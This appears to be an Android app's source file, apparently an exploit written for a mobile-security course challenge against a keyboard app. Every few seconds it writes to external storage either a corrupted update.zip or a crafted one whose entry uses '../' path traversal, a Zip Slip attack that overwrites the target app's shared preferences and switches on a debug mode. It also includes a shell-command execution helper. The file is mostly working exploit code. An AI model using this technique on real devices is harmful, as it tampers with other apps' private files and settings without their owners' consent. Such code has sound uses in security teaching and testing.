package com.mobisec.keyboard_attack;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.util.Timer;
import java.util.TimerTask;
import java.util.stream.Collectors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipOutputStream;


public class MainActivity extends AppCompatActivity {
    private final static String TAG = "MOBISEC";

    private void __genZipOverWrite(String path){
        try {
            Log.d(TAG,"path :" + path);
            File zipFile = new File(path);
            ZipOutputStream out = new ZipOutputStream(new FileOutputStream(zipFile));
            ZipEntry e = new ZipEntry("../../../data/data/com.mobisec.keyboard/shared_prefs/GlobalKeyboardPrefs.xml");
            out.putNextEntry(e);
            StringBuilder sb = new StringBuilder();
            sb.append("<map>\n" +
                    "    <int name=\"crashes\" value=\"1\" />\n" +
                    "    <boolean name=\"debugmode\" value=\"true\" />" +
                    "</map>\n");
            byte[] data = sb.toString().getBytes();
            out.write(data, 0, data.length);
            out.closeEntry();

            out.close();
        } catch (Exception e){
            Log.e(TAG,"E:" + e);
        }
    }

    private void __genZipCrash(String path){
        try {
            Log.d(TAG,"path :" + path);
            File zipFile = new File(path);
            FileOutputStream out = new FileOutputStream(zipFile);
            OutputStreamWriter myOutWriter = new OutputStreamWriter(out);
            myOutWriter.append("\0\1\2\3\4");
            myOutWriter.close();
            out.close();
        } catch (Exception e){
            Log.e(TAG,"E:" + e);
        }
    }
    private String runCmd(String cmd) {
        try {
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String out = bufferedReader.lines().collect(Collectors.joining("\n"));
            return out;
        } catch (Exception e) {
            Log.e(TAG, "E : " + e);
        }
        return "";
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if ((ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) !=
                PackageManager.PERMISSION_GRANTED) ||
                (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) !=
                        PackageManager.PERMISSION_GRANTED)) {
            requestPermissions(new String[]{android.Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
            requestPermissions(new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, 1);
        }
        Log.d(TAG,"Hello word " + BuildConfig.VERSION_CODE);
        new Timer().scheduleAtFixedRate(new TimerTask() {
            int i = 0;
            public void run() {
                if(i++%2==1){
                    Log.d(TAG,"Gen crash");
                    __genZipCrash("/storage/emulated/0/update.zip");
                } else {
                    Log.d(TAG,"Gen overwrite");
                    __genZipOverWrite("/storage/emulated/0/update.zip");
                }
            }
        }, 2000, 5000);
    }
}